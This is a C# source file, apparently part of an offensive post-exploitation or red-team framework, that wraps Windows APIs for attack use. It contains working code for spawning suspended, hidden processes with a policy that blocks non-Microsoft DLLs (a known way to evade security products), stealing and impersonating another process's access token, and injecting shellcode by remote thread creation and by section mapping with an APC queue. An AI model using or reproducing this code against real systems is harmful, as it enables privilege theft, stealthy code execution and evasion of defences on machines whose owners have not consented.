using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using WinAPI.Data.AdvApi;
using WinAPI.Data.Kernel32;
using WinAPI.PInvoke;
using WinAPI.Wrapper;
using static WinAPI.DInvoke.Data.Native;
using static WinAPI.DInvoke.Kernel32;

namespace WinAPI.PInvoke
{
    internal static class Wrapper
    {
        public static bool CloseHandle(IntPtr handle)
        {
            return Kernel32.CloseHandle(handle);
        }
        public static ProcessCreationResult CreateProcess(ProcessCreationParameters parms)
        {
            var startupInfoEx = new STARTUPINFOEX();
            startupInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startupInfoEx);
            var pInfo = new PROCESS_INFORMATION();
            var outPipe_w = IntPtr.Zero;
            PROCESS_CREATION_FLAGS creationFlags = 0;
            var result = new ProcessCreationResult();
            try
            {
                IntPtr lpSize = IntPtr.Zero;
                Kernel32.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                startupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                Kernel32.InitializeProcThreadAttributeList(startupInfoEx.lpAttributeList, 1, 0, ref lpSize);

                const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
                const int MITIGATION_POLICY = 0x20007;

                var blockDllPtr = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(blockDllPtr, new IntPtr(BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));

                _ = Kernel32.UpdateProcThreadAttribute(
                    startupInfoEx.lpAttributeList,
                    (uint)0,
                    (IntPtr)MITIGATION_POLICY,
                    blockDllPtr,
                    (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                if (parms.RedirectOutput)
                {
                    const uint USE_STD_HANDLES = 0x00000100;

                    SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
                    saAttr.bInheritHandle = true;
                    saAttr.lpSecurityDescriptor = IntPtr.Zero;
                    saAttr.nLength = Marshal.SizeOf(saAttr);
                    Kernel32.CreatePipe(out var outPipe_rd, out outPipe_w, ref saAttr, 0);

                    // Ensure the read handle to the pipe for STDOUT is not inherited.
                    Kernel32.SetHandleInformation(outPipe_rd, HANDLE_FLAGS.INHERIT, 0);


                    startupInfoEx.StartupInfo.hStdError = outPipe_w;
                    startupInfoEx.StartupInfo.hStdOutput = outPipe_w;
                    //sInfoEx.StartupInfo.hStdInput = inPipe_rd;

                    result.OutPipeHandle = outPipe_rd;


                    startupInfoEx.StartupInfo.dwFlags |= USE_STD_HANDLES;
                }

                if (parms.CreateSuspended)
                    creationFlags |= PROCESS_CREATION_FLAGS.CREATE_SUSPENDED;

                if (parms.CreateNoWindow)
                    creationFlags |= PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW;

                if (parms.Credentials != null)
                {
                    if (!Advapi.CreateProcessWithLogonW(parms.Credentials.Username, parms.Credentials.Domain, parms.Credentials.Password, (uint)LogonFlags.LogonWithProfile, parms.Application, parms.Command, (uint)creationFlags, IntPtr.Zero, parms.CurrentDirectory, ref startupInfoEx, out pInfo))
                        throw new InvalidOperationException($"Error in CreateProcessWithLogonW : {Marshal.GetLastWin32Error()}");
                }
                else if (parms.Token != IntPtr.Zero)
                {

                    if (!Advapi.CreateProcessWithTokenW(parms.Token, (uint)LogonFlags.LogonWithProfile, parms.Application, parms.Command, (uint)creationFlags, IntPtr.Zero, parms.CurrentDirectory, ref startupInfoEx, out pInfo))
                        throw new InvalidOperationException($"Error in CreateProcessWithTokenW : {Marshal.GetLastWin32Error()}");
                }
                else
                {
                    creationFlags |= PROCESS_CREATION_FLAGS.EXTENDED_STARTUPINFO_PRESENT;
                    var pSec = new SECURITY_ATTRIBUTES();
                    var tSec = new SECURITY_ATTRIBUTES();
                    pSec.nLength = Marshal.SizeOf(pSec);
                    tSec.nLength = Marshal.SizeOf(tSec);

                    if (!Kernel32.CreateProcessW(parms.Application, parms.Command, ref pSec, ref tSec, parms.RedirectOutput, (uint)creationFlags, IntPtr.Zero, parms.CurrentDirectory, ref startupInfoEx, out pInfo))
                        throw new Win32Exception($"Error in CreateProcessW : {Marshal.GetLastWin32Error()}");
                }

                result.ProcessHandle = pInfo.hProcess;
                result.ThreadHandle = pInfo.hThread;
                result.ProcessId = pInfo.dwProcessId;

            }
            finally
            {
                // Free the attribute list
                if (startupInfoEx.lpAttributeList != IntPtr.Zero)
                {
                    Kernel32.DeleteProcThreadAttributeList(startupInfoEx.lpAttributeList);
                    Marshal.FreeHGlobal(startupInfoEx.lpAttributeList);
                }
                //Marshal.FreeHGlobal(lpValue);

                Kernel32.CloseHandle(outPipe_w);
            }
            return result;
        }

        public static IntPtr StealToken(int processId)
        {
            var process = Process.GetProcessById(processId);

            var hToken = IntPtr.Zero;
            var hTokenDup = IntPtr.Zero;

            try
            {
                //open handle to token
                if (!Advapi.OpenProcessToken(process.Handle, DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
                    throw new InvalidOperationException($"Failed to open process token");


                //duplicate  token
                var sa = new SECURITY_ATTRIBUTES();
                if (!Advapi.DuplicateTokenEx(hToken, TokenAccess.TOKEN_ALL_ACCESS, ref sa, SecurityImpersonationLevel.SECURITY_IMPERSONATION, TokenType.TOKEN_IMPERSONATION, out hTokenDup))
                {
                    Kernel32.CloseHandle(hToken);
                    process.Dispose();
                    throw new InvalidOperationException($"Failed to duplicate token");
                }

                //impersonate Token
                if (!Advapi.ImpersonateLoggedOnUser(hTokenDup))
                    throw new InvalidOperationException($"Failed to impersonate token");

                //var identity = new WindowsIdentity(hTokenDup);
                return hTokenDup;
            }
            finally
            {
                if (hToken != IntPtr.Zero)
                    Kernel32.CloseHandle(hToken);
                process.Dispose();
            }
        }

        public static byte[] ReadFromPipe(IntPtr pipe, uint buffSize = 1024)
        {
            byte[] chBuf = new byte[buffSize];
            bool bSuccess = Kernel32.ReadFile(pipe, chBuf, (uint)buffSize, out var nbBytesRead, IntPtr.Zero);
            if (!bSuccess)
            {
                int lastError = Marshal.GetLastWin32Error();
                if (lastError == 109) //Broken Pipe
                    return null;
                throw new InvalidOperationException($"Failed reading pipe : {lastError}");
            }

            byte[] ret = new byte[nbBytesRead];
            Array.Copy(chBuf, ret, nbBytesRead);
            return ret;
        }

        public static void InjectCreateRemoteThread(IntPtr processHandle, IntPtr threadHandle, byte[] shellcode, int entrypointOffset = 0)
        {
            var baseAddress = Kernel32.VirtualAllocEx(
                processHandle,
                IntPtr.Zero,
                shellcode.Length,
                AllocationType.Commit |  AllocationType.Reserve,
                MemoryProtection.ReadWrite);

            if (baseAddress == IntPtr.Zero)
                throw new InvalidOperationException($"Failed to allocate memory, error code: {Marshal.GetLastWin32Error()}");


            IntPtr bytesWritten = IntPtr.Zero;
            if (!Kernel32.WriteProcessMemory(processHandle, baseAddress, shellcode, shellcode.Length, out bytesWritten))
                throw new InvalidOperationException($"Failed to write shellcode into the process, error code: {Marshal.GetLastWin32Error()}");

            if (bytesWritten.ToInt32() != shellcode.Length)
                throw new InvalidOperationException($"Failed to write All the shellcode into the process");

            if (!Kernel32.VirtualProtectEx(
                processHandle,
                baseAddress,
                shellcode.Length,
                MemoryProtection.ExecuteRead,
                out _))
            {
                throw new InvalidOperationException($"Failed to cahnge memory to execute, error code: {Marshal.GetLastWin32Error()}");
            }

            IntPtr threadres = IntPtr.Zero;

            IntPtr thread = Kernel32.CreateRemoteThread(processHandle, IntPtr.Zero, 0, baseAddress + entrypointOffset, IntPtr.Zero, 0, out threadres);

            if (thread == IntPtr.Zero)
                throw new InvalidOperationException($"Failed to create remote thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
        }

        public static void InjectProcessHollowingWithAPC(IntPtr processHandle, IntPtr threadHandle, byte[] shellcode, int entrypointOffset = 0)
        {
            const uint GENERIC_ALL = 0x10000000;
            const uint PAGE_EXECUTE_READWRITE = 0x40;
            const uint SEC_COMMIT = 0x08000000;

            var hLocalSection = IntPtr.Zero;
            var maxSize = (uint)shellcode.Length;

            var status = Native.NtCreateSection(
                ref hLocalSection,
                GENERIC_ALL,
                IntPtr.Zero,
                ref maxSize,
                PAGE_EXECUTE_READWRITE,
                SEC_COMMIT,
                IntPtr.Zero);

            const uint PAGE_READWRITE = 0x04;

            var self = System.Diagnostics.Process.GetCurrentProcess();
            var hLocalBaseAddress = IntPtr.Zero;

            ulong sectionOffset;

            status = Native.NtMapViewOfSection(
                hLocalSection,
                self.Handle,
                ref hLocalBaseAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                out sectionOffset,
                out maxSize,
                2,
                0,
                PAGE_READWRITE);

            const uint PAGE_EXECUTE_READ = 0x20;

            var hRemoteBaseAddress = IntPtr.Zero;

            status = Native.NtMapViewOfSection(
                hLocalSection,
                processHandle,
                ref hRemoteBaseAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                out sectionOffset,
                out maxSize,
                2,
                0,
                PAGE_EXECUTE_READ);

            Marshal.Copy(shellcode, 0, hLocalBaseAddress, shellcode.Length);

            var res = Native.NtQueueApcThread(
            threadHandle,
            hRemoteBaseAddress + entrypointOffset,
            IntPtr.Zero,
            IntPtr.Zero,
            IntPtr.Zero);

            UInt32 prev = 0;
            _ = Native.NtResumeThread(threadHandle, ref prev);
        }


        public static IntPtr OpenProcess(uint processId, ProcessAccessFlags desiredAccess)
        {
            IntPtr hProcess;
            var oa = new OBJECT_ATTRIBUTES();
            var clientId = new CLIENT_ID { UniqueProcess = (IntPtr)processId };

            _ = Native.NtOpenProcess(
                out hProcess,
                desiredAccess,
                ref oa,
                ref clientId
            );

            return hProcess;
        }
    }
}
